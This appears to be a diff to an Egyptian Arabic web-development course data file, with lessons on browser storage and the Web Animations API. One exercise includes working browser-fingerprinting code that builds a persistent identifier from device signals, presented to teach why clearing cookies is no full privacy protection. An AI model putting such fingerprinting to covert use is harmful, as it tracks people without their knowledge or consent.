+**ج. الـ fingerprinting:** من غير ما يخزّن حاجة خالص. كل سكربت بيقدر يقرا حاجات زي الـ user agent واللغات والـ time zone ومقاس الشاشة وعدد الأنوية، ويرسم نص على [[canvas]] (كارت الشاشة والخطوط بيطلّعوا pixels مختلفة شوية)، ويعمل hash للكل:
+
+~~~text الناتج: تمرين ٣ (Chrome 157)
+languages   en-US,en
+timeZone    Africa/Cairo
+screen      1280x720@1.0000000149011612
+cores       16
+touch       0
+colorScheme light
+canvas      4698
+بصمة: (١٦ حرف hex، طلعت هي هي في التلات مرات)
+~~~
+
+البصمة طلعت **نفسها** بعد ما مسحنا الكوكيز والـ [[localStorage]]، وعلى origin تاني ([[127.0.0.1]]). مسح الكوكيز مش بيوقفها. المتصفحات بتقاوم بإنها تقلل التفاصيل (Chrome ثبّت أرقام الـ user agent، و Safari و Firefox بيرجّعوا قيم موحّدة أو فيها noise في وضع الحماية)، ومش حاجة تقدر تتحكم فيها من موقعك.
+
+**كمطوّر:** متعملش تتبع بنفسك، وخلي بالك من السكربتات اللي بتحطها من برّه (analytics و ads و chat widgets): كلها شغالة بنفس صلاحيات كودك، بتقرا نفس الكوكيز ونفس [[localStorage]]. وقوانين زي GDPR بتطلب موافقة قبل أي كوكي أو تخزين مش ضروري لشغل الموقع.
+
+---
+
+## الخلاصة
+
+| السؤال | الإجابة |
+|---|---|
+| السيرفر محتاجه في الطلب؟ | كوكي (و [[HttpOnly]] لو JS مش محتاجه) |
+| صغير وبيعيش بعد الـ reload؟ | [[localStorage]] |
+| للتاب ده بس؟ | [[sessionStorage]] |
+| صفحات وملفات للأوفلاين؟ | Cache API |
+| كتير، أو ملفات، أو من worker؟ | IndexedDB |
+| سر؟ | السيرفر بس |
+
+اللي ميتلخبطش: أي حاجة في المتصفح ممكن تتمسح، فهي كاش مش مصدر. والكوكيز بتتقل كل طلب. والـ partitioning والـ fingerprinting سبب إن «امسح الكوكيز» مش خصوصية كاملة.`,
+          lines: [
+            R`المستخدم قبل أي حاجة: [[estimate()]] بترجّع Promise فيها [[usage]] و [[quota]] بالبايت`,
+            R`بنفتح (أو نعمل) كاش اسمه [[lab-v1]]: Cache API async ومن غير حد صغير`,
+            R`بنخزّن رد فيه ميجا بايت أصفار تحت العنوان [[/big]]`,
+            R`نقيس تاني، و [[usageDetails]] (Chrome) بتقسّم الاستخدام على الأنواع`,
+            R`بيطبع صفر، وحوالي ميجا، و [[{ caches: ... }]]، والـ quota بالجيجا`,
+            R`[[persisted()]]: هل المتصفح وعد إنه مش هيمسح التخزين ده لوحده؟ و [[caches.keys()]] أسامي الكاشات`,
+            R`بنمسح الكاش عشان التجربة متسيبش حاجة`,
+          ],
+          practice: [
+            { lvl: 'سريع', t: R`**اختار:** لكل حالة من دول اختار مكان التخزين وسبب في سطر: (١) كوكي الـ session بعد اللوجين، (٢) لغة الموقع والسيرفر بيرسم الصفحة بيها، (٣) مسودة تعليق طويل، (٤) خطوة ٢ من ٤ في فورم حجز في التاب ده، (٥) ٣٠٠ صورة منتج للأوفلاين، (٦) ٢٠٠٠ رسالة شات مع البحث فيها، (٧) رقم الكارت عشان «احفظ للمرة الجاية» (من قسم ١ في الشرح).`, done: R`٧ إجابات، و (٧) «ولا مكان في المتصفح».`, sol: R`**إجابة نموذجية:**
+
+| # | المكان | ليه |
+|---|---|---|
+| ١ | كوكي من السيرفر [[HttpOnly; Secure; SameSite=Lax]] | بتتبعت لوحدها، و XSS مبيوصلهاش |
+| ٢ | كوكي [[lang=ar; max-age=31536000; path=/]] | السيرفر محتاجها في أول طلب قبل أي JS |
+| ٣ | [[localStorage]] (بالـ JSON) | صغيرة، وتعيش لو التاب اتقفل غلط |
+| ٤ | [[sessionStorage]] | تعيش مع الـ reload، وتاب تاني يبدأ من الأول |
+| ٥ | Cache API من service worker | دي ردود HTTP كاملة، والـ SW بيردّ بيها أوفلاين |
+| ٦ | IndexedDB بـ index على الوقت والنص | كتير، و async، والبحث بـ index من غير ما تحمّل الكل |
+| ٧ | ولا مكان في المتصفح | الكارت عند شركة الدفع، وانت تحفظ token بتاعها في السيرفر |
+
+ليه مش [[localStorage]] لـ ٦: ٢٠٠٠ رسالة = ميجات JSON بتتقري sync كل مرة الصفحة تفتح، والصفحة واقفة. وليه مش كوكي لـ ٣: التعليق ممكن يبقى أطول من ٤٠٩٦ حرف، وهيتبعت مع كل طلب من غير لازمة.` },
+            { lvl: 'تطبيق', t: R`**قيس بنفسك:** على صفحة من سيرفر محلي: [[estimate()]] الأول، وبعدين خزّن ميجا في Cache API وقيس، وبعدين ميجا [[Blob]] في IndexedDB وقيس. اطبع [[usageDetails]] و [[persist()]]. وامسح اللي عملته في الآخر (من قسمي ٢ و ٣ في الشرح).`, done: R`الاستخدام زاد حوالي ميجا مع كل خطوة، و [[usageDetails]] فيها [[caches]] و [[indexedDB]]، و [[persist()]] رجّعت [[true]] أو [[false]] وعارف ليه.`, sol: R`~~~js measure.js (module في صفحة من سيرفر محلي)
+const mb = n => (n / 1024 / 1024).toFixed(2) + " MB";
+const before = (await navigator.storage.estimate()).usage;
+const cache = await caches.open("lab-v1");
+await cache.put("/big", new Response(new Uint8Array(1024 * 1024)));
+const afterCache = await navigator.storage.estimate();
+await new Promise((res, rej) => {
+  const r = indexedDB.open("lab-db", 1);
+  r.onupgradeneeded = () => r.result.createObjectStore("files");
+  r.onsuccess = () => {
+    const tx = r.result.transaction("files", "readwrite");
+    tx.objectStore("files").put(new Blob([new Uint8Array(1024 * 1024)]), "big");
+    tx.oncomplete = () => { r.result.close(); res(); };
+    tx.onerror = rej;
+  };
+});
+const afterIdb = await navigator.storage.estimate();
+console.log("قبل: " + mb(before) + " | بعد Cache: " + mb(afterCache.usage) + " | بعد IndexedDB: " + mb(afterIdb.usage));
+console.log("details: " + JSON.stringify(afterIdb.usageDetails));
+console.log("quota: " + (afterIdb.quota / 1024 ** 3).toFixed(1) + " GB");
+console.log("persist(): " + await navigator.storage.persist());
+await caches.delete("lab-v1");
+indexedDB.deleteDatabase("lab-db");
+~~~
+
+~~~text الناتج (Chrome 157، origin فاضي)
+قبل: 0.00 MB | بعد Cache: 1.00 MB | بعد IndexedDB: 2.00 MB
+details: {"caches":1049088,"indexedDB":1052336}
+quota: 10.0 GB
+persist(): false
+~~~
+
+- **IndexedDB بالأحداث:** [[onupgradeneeded]] أول مرة بس (عشان نعمل الـ store)، و [[onsuccess]] لما القاعدة تفتح، و [[tx.oncomplete]] لما الكتابة تتأكد. لفّيناهم في Promise زي درس «callbacks و events».
+- **[[persist()]] = [[false]]:** origin جديد على localhost ومحدش بيزوره. على موقع متسطب كـ PWA أو بيتزار كتير Chrome بيوافق لوحده.
+- **الأرقام فوق الميجا** (١٠٤٩٠٨٨ و ١٠٥٢٣٣٦): التخزين نفسه ليه مصاريف (headers الرد، والـ metadata).
+- **أي حاجة في الـ quota ممكن تتمسح** لو الديسك اتملا، فالمسح في الآخر عادة كويسة في التجارب.` },
+            { lvl: 'تطبيق', t: R`**دوّر بنفسك:** صفحة بتجمع حاجات زي اللي في قسم ٤-ج: [[userAgent]] و [[languages]] و [[timeZone]] من [[Intl]] و [[screen]] و [[devicePixelRatio]] و [[hardwareConcurrency]] و [[maxTouchPoints]] و [[prefers-color-scheme]] وطول [[canvas.toDataURL()]] لنص مرسوم، وتعمل منهم SHA-256 بـ [[crypto.subtle.digest]] وتعرض أول ١٦ حرف. امسح الكوكيز والـ [[localStorage]] واعمل reload: البصمة اتغيّرت؟ (من قسم ٤ في الشرح).`, done: R`البصمة هي هي بعد المسح وعلى origin تاني، وعرفت إن مفيش ولا حاجة من دول محتاجة إذن.`, sol: R`~~~html fingerprint.html
+<pre id="out"></pre>
+<script type="module">
+const signals = {
+  userAgent: navigator.userAgent,
+  languages: navigator.languages.join(","),
+  timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  screen: screen.width + "x" + screen.height + "@" + devicePixelRatio,
+  cores: navigator.hardwareConcurrency,
+  touch: navigator.maxTouchPoints,
+  colorScheme: matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light",
+};
+const canvas = document.createElement("canvas");
+const ctx = canvas.getContext("2d");
+ctx.font = "16px serif";
+ctx.fillText("متجر النور ☕ 123", 4, 20);
+signals.canvas = canvas.toDataURL().length;
+
+const text = JSON.stringify(signals);
+const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
+const id = [...new Uint8Array(hash)].slice(0, 8).map(b => b.toString(16).padStart(2, "0")).join("");
+const lines = Object.entries(signals).map(([k, v]) => k.padEnd(12) + String(v).slice(0, 60));
+document.querySelector("#out").textContent = lines.join("\n") + "\n\nبصمة: " + id;
+</script>
+~~~
+
+~~~text الناتج (Chrome 157، والـ userAgent متشال من العرض)
+languages   en-US,en
+timeZone    Africa/Cairo
+screen      1280x720@1.0000000149011612
+cores       16
+touch       0
+colorScheme light
+canvas      4698
+
+بصمة: (١٦ حرف hex)
+~~~
+
+ونفس الـ ١٦ حرف طلعوا ٣ مرات: أول تحميل، وبعد مسح الكوكيز و [[localStorage]] و reload، وعلى [[http://127.0.0.1]] بدل [[localhost]].
+
+- **[[crypto.subtle.digest]]** محتاج secure context (https أو localhost)، وبيرجّع [[ArrayBuffer]] فحوّلناه hex.
+- **[[1.0000000149011612]]:** الزوم بتاع البروفايل خلّى الـ [[devicePixelRatio]] رقم مش مدوّر. تفصيلة صغيرة زي دي بتفرّق جهاز عن جهاز أكتر.
+- **[[canvas]]:** طول الصورة نفسه بيختلف بين الأجهزة حسب الخطوط وكارت الشاشة. المكتبات الحقيقية بتعمل hash للـ pixels مش الطول، وبتضيف عشرات الحاجات التانية (الخطوط المتسطبة، والصوت، و WebGL).
+- **عشان كده** «امسح الكوكيز» مش كفاية لو حد عايز يتتبعك، والحماية الحقيقية في المتصفح نفسه.` },
+            { lvl: 'تطبيق', t: R`**ابني:** بـ Cache API من الصفحة (من غير service worker): خزّن [[/hello.txt]] بـ [[cache.add]]، واقطع النت (DevTools: Network ثم Offline)، وجرّب [[fetch]] ثم [[caches.match]]. واكتب [[getText(url)]] بتجرّب الشبكة الأول ولو فشلت ترجع للكاش (من قسم ٢ في الشرح).`, done: R`[[fetch]] أوفلاين رمى [[TypeError: Failed to fetch]]، و [[caches.match]] رجّع النص، و [[getText]] رجّعت النص في الحالتين، وملف مش متخزّن رجّع [[undefined]].`, sol: R`~~~js offline-text.js (صفحة من سيرفر محلي، module)
+const cache = await caches.open("offline-v1");
+await cache.add("/hello.txt");
+console.log((await cache.keys()).map(r => new URL(r.url).pathname).join(","));
+
+async function getText(url) {
+  try {
+    const res = await fetch(url);
+    if (res.ok) {
+      (await caches.open("offline-v1")).put(url, res.clone());
+      return res.text();
+    }
+  } catch {}
+  const hit = await caches.match(url);
+  return hit ? hit.text() : undefined;
+}
+
+// اقطع النت هنا (Playwright: context.setOffline(true))
+try { await fetch("/hello.txt"); } catch (e) { console.log("fetch: " + e.name + ": " + e.message); }
+console.log("cache: " + JSON.stringify(await (await caches.match("/hello.txt")).text()));
+console.log("miss: " + String(await caches.match("/nope.txt")));
+console.log("getText: " + JSON.stringify(await getText("/hello.txt")));
+~~~
+
+~~~text الناتج (Chrome 157، النت اتقطع من Playwright بعد السطر التالت)
+/hello.txt
+fetch: TypeError: Failed to fetch
+cache: "أهلًا من ملف نص\nسطر تاني\n"
+miss: undefined
+getText: "أهلًا من ملف نص\nسطر تاني\n"
+~~~
+
+- **[[res.clone()]]:** الـ body بيتقرا مرة واحدة (درس «REST و CRUD بـ fetch»)، ومحتاجينه مرتين: للكاش ولليوزر.
+- **ده «network first»:** الشبكة الأول عشان الداتا تبقى جديدة، والكاش احتياطي. الاستراتيجيات التانية (cache first، stale-while-revalidate) في درس «استراتيجيات الكاش».
+- **من غير service worker** ده بينفع لداتا تجيبها بـ [[fetch]] بس. عشان الصفحة نفسها تفتح أوفلاين لازم SW.
+- **[[catch {}]] الفاضي هنا مقصود:** أي فشل شبكة = روح للكاش.` },
+          ],
+          ref: [
+            { t: "MDN Learn: Client-side storage", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Client-side_APIs/Client-side_storage" },
+            { t: "MDN: Cache", url: "https://developer.mozilla.org/en-US/docs/Web/API/Cache" },
+            { t: "MDN: IndexedDB API", url: "https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" },
+            { t: "MDN: StorageManager.estimate()", url: "https://developer.mozilla.org/en-US/docs/Web/API/StorageManager/estimate" },
+            { t: "MDN: Storage quotas and eviction criteria", url: "https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria" },
+            { t: "MDN: State Partitioning", url: "https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/State_Partitioning" },
+            { t: "MDN: Third-party cookies", url: "https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/Third-party_cookies" },
+            { t: "MDN: Fingerprinting", url: "https://developer.mozilla.org/en-US/docs/Glossary/Fingerprinting" },
+          ],
+          pre: [{ to: "js/IndexedDB و BroadcastChannel", why: R`IndexedDB بالتفصيل: stores و indexes و transactions` }, { to: "js/استراتيجيات الكاش", why: R`Cache API من الـ service worker وإزاي تختار استراتيجية` }, { to: "js/دورة حياة الـ SW", why: R`الـ service worker اللي بيستخدم Cache API عشان الموقع يفتح أوفلاين` }, { to: "web/Clear site data", why: R`تمسح كل تخزين الموقع من DevTools وانت بتجرّب` }],
+          deep: {
+            why: R`الاختيار الغلط بيبان متأخر: موقع بطيء لأن [[localStorage]] فيه ميجات، أو لوجين اتسرق لأن التوكن في مكان JS بيشوفه، أو داتا اليوزر راحت لأن المتصفح مسح التخزين. والـ MDN Curriculum بيطلب كمان تعرف الجانب الأخلاقي: نفس الأدوات بتتستخدم للتتبع.`,
+            how: R`كل نوع ليه storage منفصل في البروفايل، والـ Cache و IndexedDB و Web Storage متجمّعين تحت «storage bucket» واحد لكل origin (أو لكل origin + الموقع اللي فوق لو جوه iframe: ده الـ partitioning). الـ quota بتتحسب على الـ bucket ده، والـ eviction بيمسحه كله مرة واحدة. والكوكيز في jar منفصل بقواعد [[SameSite]] و [[Partitioned]].`,
+            when: R`ابدأ بالسؤال: «السيرفر محتاجه في الطلب؟» (كوكي). «صغير وبسيط؟» (Web Storage). «طلبات وردود؟» (Cache). «كتير أو ملفات أو worker؟» (IndexedDB). وقبل أي سكربت third-party اسأل: هيقرا إيه من التخزين ده، ومحتاج موافقة اليوزر؟`,
+            mistakes: R`داتا كبيرة في [[localStorage]]. أسرار في أي مكان في المتصفح. الاعتماد على إن التخزين مش هيتمسح. كوكيز تقيلة. افتراض إن iframe هيشوف نفس التخزين بتاعه في كل المواقع. اختبار الخصوصية في متصفح آلي بإعدادات مختلفة بس. سكربتات third-party من غير ما تعرف بتقرا إيه.`,
+          },
+        },
+        {
+          cmd: "Web Animations API: element.animate",
+          title: "نفس الـ @keyframes بتاعة CSS بس من JavaScript: animation تشغّلها وتوقفها وتعكسها وتستنى تخلص",
+          desc: R`[[element.animate(keyframes, options)]] بيعمل animation زي [[@keyframes]] بتاعة CSS، بس من الكود، ويرجّعلك object [[Animation]] تتحكم فيه: [[play()]] و [[pause()]] و [[reverse()]] و [[finish()]] و [[cancel()]]، و [[currentTime]] و [[playbackRate]]، و [[finished]] (Promise بتتحل لما تخلص). وكمان [[document.getAnimations()]] بيرجّع كل الـ animations في الصفحة، حتى اللي عاملها CSS، فتقدر توقفها أو تستناها من JS.
+• الـ keyframes: array من objects ([[[{ opacity: 0 }, { opacity: 1 }]]]) أو object فيه arrays ([[{ opacity: [0, 1] }]])، والخصايص بأسامي JS ([[backgroundColor]]).
+• الـ options: [[duration]] (ms) و [[easing]] و [[delay]] و [[iterations]] و [[direction]] و [[fill]] و [[id]].
+• استخدمه للحركة اللي بتتحسب وقت التشغيل أو محتاجة تحكم أو تستنى نهايتها، وخلي الباقي CSS. ولو اليوزر طالب [[prefers-reduced-motion]]: قللها أو شيلها.`,
+          example: R`const box = document.querySelector("#a");
+const anim = box.animate(
+  [{ transform: "translateX(0)" }, { transform: "translateX(-200px)", opacity: 0.5 }],
+  { duration: 1000, easing: "ease-out", fill: "forwards", id: "slide" }
+);
+console.log(anim.playState, anim.id, anim.effect.getTiming().duration);
+anim.pause();
+anim.currentTime = 500;
+console.log(anim.currentTime, anim.playState, getComputedStyle(box).transform);
+anim.playbackRate = 4;
+anim.play();
+await anim.finished;
+console.log(anim.playState, getComputedStyle(box).transform, getComputedStyle(box).opacity);`,
+          try: R`بعد المثال، اعمل [[anim.reverse()]] واستنى [[anim.finished]]: الصندوق رجع فين و [[currentTime]] بقى كام؟ وبعدين [[const x = box.animate({ opacity: [1, 0] }, 1000); x.finished.catch(e => console.log(e.name)); x.cancel();]]: إيه اللي اتطبع و [[x.playState]] بقت إيه؟`,
+          sol: R`~~~text الناتج (Chrome 157، [[<script type="module">]])
+reversed: finished 0 none
+after cancel: idle
+cancel: AbortError The user aborted a request.
+~~~
+
+- **[[reverse()]]** قلب الاتجاه وشغّل: رجع لـ [[currentTime]] صفر، والـ [[transform]] بقى [[none]] (الـ [[fill: "forwards"]] بيمسك آخر frame بس لما بيخلص للأمام).
+- **[[cancel()]]** شال تأثير الـ animation خالص ورجّع [[playState]] [["idle"]]، و **[[finished]] اترفضت** بـ [[AbortError]]. لو مكتبتش [[.catch]] هيطلع «Uncaught (in promise)» في الـ Console.
+- «after cancel» اتطبع قبل «cancel: AbortError» لأن الـ [[.catch]] async (microtask).`,
+          teach: R`## الفكرة
+
+في CSS بتكتب الحركة مرة وبتشتغل لوحدها (درس «transition و @keyframes»). بس ساعات محتاج:
+
+- الأرقام تتحسب وقت التشغيل (روح من مكان الضغطة، اطلع بمقدار عرض العنصر).
+- تتحكم: وقّف، اعكس، أسرع، اقفز لنص الحركة.
+- تعرف إمتى خلصت عشان تعمل حاجة بعدها (امسح العنصر، ابدأ اللي بعدها).
+
+ده الـ Web Animations API (WAAPI). وهو نفس المحرك اللي بيشغّل CSS animations: نفس الـ keyframes ونفس الـ easing ونفس الأداء. كل النواتج من Chrome 157 على صفحة من سيرفر محلي.
+
+---
+
+## ١. [[element.animate(keyframes, options)]]
+
+~~~text الناتج: سطر ٦ في المثال
+running slide 1000
+~~~
+
+**الـ keyframes** = الـ [[@keyframes]] بتاعة CSS كـ array:
+
+~~~js
+// CSS:  @keyframes slide { from { transform: translateX(0) } to { transform: translateX(-200px); opacity: .5 } }
+[{ transform: "translateX(0)" }, { transform: "translateX(-200px)", opacity: 0.5 }]
+// نفس الحكاية بشكل تاني: object فيه array لكل خاصية
+{ transform: ["translateX(0)", "translateX(-200px)"], opacity: [1, 0.5] }
+~~~
+
+- الخصايص بأسامي JS: [[backgroundColor]] مش [[background-color]]، و [[float]] تتكتب [[cssFloat]].
+- [[offset]] (من ٠ لـ ١) بيحط الـ keyframe في نسبة معينة زي [[50%]] في CSS. لو مش متكتب بيتوزّعوا بالتساوي. وترتيبه لازم يزيد: [[[{ offset: 0.8 }, { offset: 0.2 }]]] بيرمي [[TypeError: Failed to execute 'animate' on 'Element': Offsets must be monotonically non-decreasing.]]
+- ممكن keyframe واحد بس أو خصايص مش في كل الـ keyframes ([[[{ transform: "none" }, { color: "red" }]]] اشتغلت): المتصفح بيكمّل من القيمة الحالية.
+
+**الـ options** (لو حطيت رقم بس بدل object يبقى [[duration]]):
+
+| الـ option | في CSS | مثال |
+|---|---|---|
+| [[duration]] | [[animation-duration]] بس بالـ ms | [[400]]. سالب = [[TypeError: ... duration must be non-negative or auto]] |
+| [[easing]] | [[animation-timing-function]] | [["ease-out"]] و [["cubic-bezier(.2,.8,.2,1)"]] و [["steps(4)"]]. [["bounce"]] = [[TypeError: ... 'bounce' is not a valid value for easing]] |
+| [[delay]] و [[endDelay]] | [[animation-delay]] | [[200]] |
+| [[iterations]] | [[animation-iteration-count]] | [[3]] أو [[Infinity]] |
+| [[direction]] | [[animation-direction]] | [["alternate"]] |
+| [[fill]] | [[animation-fill-mode]] | [["forwards"]] (افضل على آخر frame) و [["both"]] |
+| [[composite]] | [[animation-composition]] | [["add"]]: تزوّد على التحويل الموجود |
+| [[id]] | اسم تلاقيه بيه | [["slide"]] |
+
+---
+
+## ٢. الـ [[Animation]] object: التحكم
+
+~~~text الناتج: المثال كله
+running slide 1000
+500 paused matrix(1, 0, 0, 1, -136.929, 0)
+finished matrix(1, 0, 0, 1, -200, 0) 0.5
+~~~
+
+| | بيعمل |
+|---|---|
+| [[play()]] و [[pause()]] | يشغّل ويوقف |
+| [[reverse()]] | يعكس الاتجاه ويشغّل ([[playbackRate]] بيبقى بالسالب) |
+| [[finish()]] | يقفز للآخر |
+| [[cancel()]] | يشيل التأثير خالص، و [[finished]] بترفض بـ [[AbortError]] |
+| [[currentTime]] | فين في الحركة بالـ ms، وتقدر تكتبه (scrubbing) |
+| [[playbackRate]] | السرعة: [[2]] أسرع، [[0.5]] أبطأ، [[-1]] بالعكس. [[updatePlaybackRate()]] بتغيّرها من غير قفزة |
+| [[playState]] | [["idle"]] و [["running"]] و [["paused"]] و [["finished"]] |
+| [[finished]] | Promise بتتحل لما تخلص (وفيه [[onfinish]] و [[oncancel]] لو عايز حدث) |
+| [[commitStyles()]] | يكتب القيم الحالية في [[style]] العنصر |
+
+**ليه [[-136.929]] مش [[-100]] في نص الوقت:** [[easing: "ease-out"]] بيمشي بسرعة في الأول ويبطّأ في الآخر، فعند ٥٠٠ ms (نص المدة) الصندوق قطع حوالي ٦٨٪ من المسافة. مع [["linear"]] كان هيبقى [[-100]] بالظبط.
+
+**[[await anim.finished]]** هو أهم حاجة في الـ API: تعمل الحاجة بعد الحركة من غير [[setTimeout]] بنفس المدة (اللي بيبوظ لو المدة اتغيّرت أو التاب اتخفى). المثال الكلاسيكي: امسح العنصر بعد ما يختفي:
+
+~~~js
+const out = li.animate([{ opacity: 1 }, { opacity: 0 }], { duration: 200, fill: "forwards" });
+await out.finished;
+li.remove();
+~~~
+
+---
+
+## ٣. [[fill]] و [[commitStyles()]]: العنصر بيرجع لمكانه
+
+من غير [[fill]] الحركة بتخلص والعنصر **بيرجع** لشكله في الـ CSS، لأن الـ animation طبقة فوق الـ style مش تعديل فيه. الحلول:
+
+| | النتيجة | العيب |
+|---|---|---|
+| [[fill: "forwards"]] | بيفضل على آخر frame | الـ animation فاضلة شغالة وماسكة الخاصية، ولو غيّرت [[style]] بعدين مش هيبان |
+| [[commitStyles()]] ثم [[cancel()]] | القيمة اتكتبت في [[style]] والـ animation اتشالت | سطرين زيادة |
+| تغيّر [[style]] قبل [[animate]] | الشكل النهائي في الـ CSS، والـ animation من القديم للجديد | لازم تعرف البداية |
+
+~~~text الناتج: scale بـ fill: "forwards"، وبعد finished: commitStyles() ثم cancel()
+commitStyles: scale(1.5) 0
+~~~
+
+[[box.style.transform]] بقى [["scale(1.5)"]] و [[box.getAnimations().length]] = [[0]]: الشكل ثابت ومفيش animation فاضلة.
+
+---
+
+## ٤. [[getAnimations()]]: CSS و WAAPI نفس الحاجة
+
+صفحة فيها عنصر عليه [[animation: spin 2s linear infinite]] (CSS)، وعنصر عليه [[transition: opacity 1s]] واتغيّرت الـ opacity:
+
+~~~text الناتج
+CSSTransition:opacity, CSSAnimation:spin
+running
+paused
+~~~
+
+[[document.getAnimations()]] رجّع animation الـ CSS و الـ transition كـ objects (والـ transition اتعملت بعد [[getComputedStyle]] على العنصر، تمرين ٥ بيشرح ليه) ([[CSSAnimation]] و [[CSSTransition]] بيورثوا من [[Animation]])، وعملنا [[pause()]] لـ animation الـ CSS من JS. يعني تقدر:
+
+- تستنى transition CSS تخلص: [[await Promise.all(el.getAnimations().map(a => a.finished))]].
+- توقف كل الحركة في الصفحة: [[document.getAnimations().forEach(a => a.pause())]].
+
+---
+
+## ٥. CSS ولا WAAPI؟
+
+| استخدم CSS لما | استخدم WAAPI لما |
+|---|---|
+| الحركة ثابتة ومعروفة (hover، loading spinner، ظهور) | الأرقام بتتحسب وقت التشغيل (من مكان الضغطة، FLIP) |
+| مربوطة بحالة (class اتضاف، [[:hover]]) | محتاج تتحكم: pause و reverse و السرعة و scrubbing |
+| مش محتاج تعرف إمتى خلصت | محتاج تستنى النهاية ([[finished]]) |
+| كل الـ variants في ملف CSS | animation لعنصر اتعمل من JS (toast، item اتضاف) |
+
+الاتنين بيشتغلوا على الـ compositor (من غير ما يوقفوا الـ main thread) لو بتحرّك [[transform]] و [[opacity]] بس. حرّك [[left]] أو [[width]] وهيبقى أتقل في الاتنين. والمكتبات الكبيرة (Motion و GSAP) مبنية على نفس الأفكار، و Motion بيستخدم WAAPI جوه.
+
+---
+
+## ٦. [[prefers-reduced-motion]]
+
+ناس كتير بيدوخوا أو بيتشتتوا من الحركة، وبيفعّلوا «قلّل الحركة» في النظام. CSS بيقراها بـ [[@media (prefers-reduced-motion: reduce)]] (درس «تكبير الخط و prefers-reduced-motion»)، و JS بـ [[matchMedia]]:
+
+~~~js
+const calm = matchMedia("(prefers-reduced-motion: reduce)");
+const frames = calm.matches ? [{ opacity: 0 }, { opacity: 1 }] : [{ opacity: 0, transform: "translateY(16px)" }, { opacity: 1, transform: "none" }];
+~~~
+
+القاعدة: الحركة اللي بتشرح حاجة (عنصر بيختفي) تفضل بس أهدى (fade بدل slide). الزينة والاهتزاز تتشال. اتقاس في تمرين ٤ ومشروع الإشعارات: مع [[reducedMotion: "reduce"]] من Playwright، الـ keyframes بقت من غير [[transform]] والاهتزاز ماتعملش خالص.
+
+**الـ preview الحي في الموقع ده** بيشغّل [[element.animate]] عادي (sandbox بيسمح بيه)، فالتمارين اللي تحت بتتجرّب في الصفحة نفسها.
+
+---
+
+## الخلاصة
+
+| عايز | اكتب |
+|---|---|
+| حركة من JS | [[el.animate([{...}, {...}], { duration, easing, fill })]] |
+| تعمل حاجة بعدها | [[await anim.finished]] |
+| تتحكم | [[pause()]] و [[play()]] و [[reverse()]] و [[finish()]] و [[cancel()]] |
+| تفضل على الآخر | [[fill: "forwards"]]، أو [[commitStyles()]] ثم [[cancel()]] |
+| animations الـ CSS من JS | [[el.getAnimations()]] |
+| تحترم اليوزر | [[matchMedia("(prefers-reduced-motion: reduce)")]] |
+
+اللي ميتلخبطش: الـ animation طبقة فوق الـ style فالعنصر بيرجع من غير [[fill]]، و [[cancel()]] بيرفض [[finished]]، و [[duration]] بالـ ms، وحرّك [[transform]] و [[opacity]].`,
+          lines: [
+            R`بنجيب الصندوق اللي هنحرّكه من الصفحة بالـ id بتاعه`,
+            R`[[animate]] بترجّع [[Animation]] object على طول، والحركة بتبدأ لوحدها`,
+            R`الـ keyframes: من مكانه لـ ٢٠٠px شمال (في صفحة RTL) ونص شفاف`,
+            R`ثانية، وبتبطّأ في الآخر، وتفضل على آخر frame، واسمها [["slide"]]`,
+            R`قفلة [[animate()]]`,
+            R`[["running"]] و [["slide"]] و [[1000]]: الـ object فيه حالته والـ timing بتاعه`,
+            R`بنوقّف الحركة: [[playState]] بقت [["paused"]] والصندوق واقف مكانه`,
+            R`اقفز لنص المدة (scrubbing): الصندوق بيترسم في المكان ده على طول`,
+            R`[[500]] و [["paused"]] و [[-136.929]] بسبب الـ [[ease-out]]`,
+            R`بنخلي السرعة أربع أضعاف قبل ما نكمّل، فالنص الفاضل بياخد ١٢٥ms بس`,
+            R`[[play()]] بتكمّل من الـ [[currentTime]] اللي وقفنا عنده، مش من الأول`,
+            R`استنى لحد ما تخلص: Promise من غير [[setTimeout]]`,
+            R`[["finished"]] و [[-200]] و [[0.5]]: [[fill: "forwards"]] ماسك آخر frame`,
+          ],
+          practice: [
+            { lvl: 'تطبيق', t: R`**ابني:** فورم كلمة سر، لو غلط: الحقل يتهز (keyframes يمين وشمال في ٤٠٠ms) ويتحط عليه border أحمر ورسالة. لو داس مرتين ورا بعض الاهتزاز يبدأ من الأول مش يتراكب. ولو [[prefers-reduced-motion]]: الرسالة واللون بس من غير اهتزاز (من قسمي ١ و ٦ في الشرح).`, done: R`كلمة غلط = اهتزاز ورسالة، وضغطتين ورا بعض = animation واحدة بس على الحقل، و [[1234]] = «أهلًا!»، ومع reduced motion مفيش animation خالص.`, sol: R`~~~live 200 اهتزاز كلمة السر (جرّب أي كلمة غير 1234)
+<style>
+  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; }
+  input, button { font: inherit; padding: 4px 8px; }
+  .bad { border: 2px solid #b42318; }
+</style>
+<form id="login">
+  <label>كلمة السر <input id="pass" type="password" autocomplete="off"></label>
+  <button>ادخل</button>
+  <p id="msg" role="alert"></p>
+</form>
+<script>
+const form = document.querySelector("#login");
+const pass = document.querySelector("#pass");
+const calm = matchMedia("(prefers-reduced-motion: reduce)");
+let shake = null;
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  if (pass.value === "1234") { document.querySelector("#msg").textContent = "أهلًا!"; pass.classList.remove("bad"); return; }
+  document.querySelector("#msg").textContent = "كلمة السر غلط";
+  pass.classList.add("bad");
+  if (calm.matches) return;
+  shake?.cancel();
+  shake = pass.animate(
+    [{ translate: "0" }, { translate: "-8px" }, { translate: "8px" }, { translate: "-6px" }, { translate: "6px" }, { translate: "0" }],
+    { duration: 400, easing: "ease-in-out" }
+  );
+});
+</script>
+~~~
+
+~~~text الناتج (Chrome 157، Playwright)
+كلمة غلط:                 «كلمة السر غلط»، animations على الحقل: 1، class="bad"
+ضغطة تانية على طول:        animations على الحقل: 1
+reducedMotion = "reduce": animations على الحقل: 0
+1234:                     «أهلًا!»
+~~~
+
+- **[[translate]] مش [[transform]]:** خاصية CSS لوحدها للإزاحة، فلو الحقل عليه [[transform]] تاني (scale مثلًا) مش هيتمسح وقت الاهتزاز.
